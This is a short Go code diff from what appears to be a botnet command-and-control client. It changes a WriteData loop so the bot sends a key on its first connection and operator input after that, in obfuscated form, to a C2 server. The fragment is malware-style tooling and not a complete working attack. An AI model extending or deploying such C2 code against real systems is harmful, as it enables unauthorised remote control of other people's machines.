@@ -27,8 +27,13 @@ func ConnectToCommandingC2() net.Conn {
 
 func WriteData(server net.Conn, B *msg.Bot) {
 	for {
-		B.Com.Data = messageInput("Data")
-		B.Com.Command = []byte("")
+		if msg.FirstConnection {
+			B.Com.Command = []byte("")
+			B.Com.Data = msg.Key
+		} else {
+			B.Com.Data = messageInput("Data")
+			B.Com.Command = []byte("")
+		}
 
 		x, err := server.Write(B.ObfuscateData())
 		if err != nil {
